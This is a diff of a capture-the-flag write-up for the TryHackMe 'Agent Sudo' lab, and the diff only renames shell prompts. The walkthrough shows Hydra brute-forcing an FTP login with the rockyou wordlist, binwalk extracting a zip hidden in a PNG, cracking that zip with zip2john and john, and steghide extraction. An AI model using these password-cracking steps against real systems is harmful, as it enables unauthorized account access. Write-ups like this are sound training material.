@@ -30,11 +30,11 @@ We know that agent C's (chirs) password is weak, and he have something to do wit
 
 We know that Chris pass word is weak, let use Hydra to crack FTP.
 ```console
-kali@kali:~$ hydra -f -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
+bibo318@parrot:~$ hydra -f -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
 ```
 now log in as Chris
 ```console
-kali@kali:~/THM/agent$ ftp $IP
+bibo318@parrot:~/THM/agent$ ftp $IP
 Connected to 10.10.142.53.
 220 (vsFTPd 3.0.3)
 Name (10.10.142.53:kali): chris
@@ -52,7 +52,7 @@ ftp> ls
 ```
 get all the files !!
 ```console
-kali@kali:~/THM/agent$ cat To_agentJ.txt 
+bibo318@parrot:~/THM/agent$ cat To_agentJ.txt 
 Dear agent J,
 
 All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
@@ -63,7 +63,7 @@ Agent C
 as the message said agent J's login password is somehow stored in the **fake picture**. So I have no choice than try to brute force steghide on the pictures. I found a simple bash script [here](https://gist.github.com/itsecurityco/503970852ac47cd6a3b356590d824a2c) which can be use to brute forcing steghid. copy the script and make it executable (``chmod +x``). Now run the script.
 
 ```console
-kali@kali:~/THM/agent$ ../../script/steghidebf.sh cutie.png /usr/share/wordlists/rockyou.txt 
+bibo318@parrot:~/THM/agent$ ../../script/steghidebf.sh cutie.png /usr/share/wordlists/rockyou.txt 
 Steghide Bruteforce (c) 2017 by Juan Escobar
 stegofile: cutie.png
 wordlist:  /usr/share/wordlists/rockyou.txt
@@ -73,9 +73,9 @@ steghide: the file format of the file "cutie.png" is not supported.
 ```
 it didnt works... why?
 ```console
-kali@kali:~/THM/agent$ file cutie.png 
+bibo318@parrot:~/THM/agent$ file cutie.png 
 cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
-kali@kali:~/THM/agent$ binwalk cutie.png 
+bibo318@parrot:~/THM/agent$ binwalk cutie.png 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -86,20 +86,20 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ```
 ahaaa that what Chris mean with **fake picture**, this file included a zip file. let use `binwalk` to extrack the hidden files.
 ```console
-kali@kali:~/THM/agent$ binwalk -e cutie.png 
-kali@kali:~/THM/agent$ ls
+bibo318@parrot:~/THM/agent$ binwalk -e cutie.png 
+bibo318@parrot:~/THM/agent$ ls
 cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
-kali@kali:~/THM/agent$ ls _cutie.png.extracted/
+bibo318@parrot:~/THM/agent$ ls _cutie.png.extracted/
 365  365.zlib  8702.zip  To_agentR.txt
 ```
 we need password to be able to extract the *.zip*. we will use `zip2john` to convert it to hash format then use `john` to crack it
 ```console
-root@kali:~# zip2john /home/kali/THM/agent/_cutie.png.extracted/8702.zip > /home/kali/THM/agent/zip2john.txt
-root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt /home/kali/THM/agent/zip2john.txt
+bibo318@kali:~# zip2john /home/kali/THM/agent/_cutie.png.extracted/8702.zip > /home/kali/THM/agent/zip2john.txt
+bibo318@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt /home/kali/THM/agent/zip2john.txt
 ```
 I got the password and tried to extract the zip it with `xarchiver` but got error. let try with 7z
 ```console
-kali@kali:~/THM/agent/_cutie.png.extracted$ 7z e 8702.zip 
+bibo318@parrot:~/THM/agent/_cutie.png.extracted$ 7z e 8702.zip 
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
 p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7820HQ CPU @ 2.90GHz (906E9),ASM,AES-NI)
@@ -130,9 +130,9 @@ Everything is Ok
 
 Size:       86
 Compressed: 280
-kali@kali:~/THM/agent/_cutie.png.extracted$ ls
+bibo318@parrot:~/THM/agent/_cutie.png.extracted$ ls
  365   365.zlib   8702  '8702-(1)'   8702.zip   To_agentR.txt
-kali@kali:~/THM/agent/_cutie.png.extracted$ cat To_agentR.txt 
+bibo318@parrot:~/THM/agent/_cutie.png.extracted$ cat To_agentR.txt 
 Agent C,
 
 We need to send the picture to 'QXJlYTUx' as soon as possible!
@@ -142,10 +142,10 @@ Agent R
 ```
 use CyberChef magic `QXJlYTUx` -> bas64 -> <password>
 ```console
-kali@kali:~/THM/agent$ steghide extract -sf cute-alien.jpg 
+bibo318@parrot:~/THM/agent$ steghide extract -sf cute-alien.jpg 
 Enter passphrase: 
 wrote extracted data to "message.txt".
-kali@kali:~/THM/agent$ cat message.txt 
+bibo318@parrot:~/THM/agent$ cat message.txt 
 Hi <username>,
 
 Glad you find this message. Your login password is <password>
